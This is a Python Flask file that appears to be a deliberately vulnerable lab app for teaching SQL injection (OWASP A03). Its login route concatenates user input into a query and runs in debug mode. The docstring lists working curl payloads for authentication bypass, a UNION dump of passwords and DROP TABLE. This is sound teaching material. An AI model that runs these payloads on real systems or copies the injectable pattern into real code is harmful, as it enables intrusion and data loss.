"""
OWASP A03:2021 - Injection
Vulnerability: SQL Injection via unsanitised string concatenation.

User-supplied input is embedded directly into a SQL query string.
An attacker can inject SQL syntax to bypass authentication, read all
records, or destroy data.

Run:
    pip install flask
    python app.py

Exploit examples (pass as query string):
    # Bypass authentication — logs in as the first user (admin) without knowing any password
    curl "http://127.0.0.1:5000/login?username=' OR '1'='1' --&password=anything"

    # Dump all usernames and passwords using UNION injection
    curl "http://127.0.0.1:5000/login?username=' UNION SELECT 1,username,password,'x' FROM users --&password=x"

    # Drop the users table (destructive)
    curl "http://127.0.0.1:5000/login?username='; DROP TABLE users; --&password=x"
"""

import sqlite3
from flask import Flask, request, jsonify

app = Flask(__name__)
DB = "users.db"


def init_db():
    conn = sqlite3.connect(DB)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS users
        (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)
    """)
    conn.execute("INSERT OR IGNORE INTO users VALUES (1, 'alice', 'secret', 'user')")
    conn.execute("INSERT OR IGNORE INTO users VALUES (2, 'admin', 'adminpass', 'admin')")
    conn.commit()
    conn.close()


@app.route("/login", methods=["GET"])
def login():
    username = request.args.get("username", "")
    password = request.args.get("password", "")

    # VULNERABILITY: User input is concatenated directly into the SQL string.
    # The database engine will parse whatever the user provides as SQL syntax.
    # There is no separation between the query structure and the data values.
    query = (
        f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    )
    # Example of the constructed query when exploited:
    # SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
    # The -- starts a SQL comment, ignoring the rest. '1'='1' is always true.

    conn = sqlite3.connect(DB)
    try:
        # VULNERABLE: raw string query — user input is treated as executable SQL
        result = conn.execute(query).fetchone()
    except sqlite3.OperationalError as e:
        return jsonify({"error": str(e)}), 500
    finally:
        conn.close()

    if result:
        # VULNERABILITY: Returns the role field from the first matching row,
        # which an attacker can manipulate to gain admin access.
        return jsonify({"logged_in": True, "role": result[3]}), 200
    return jsonify({"logged_in": False}), 401


if __name__ == "__main__":
    init_db()
    # VULNERABILITY: debug=True exposes full stack traces to the client
    app.run(debug=True)
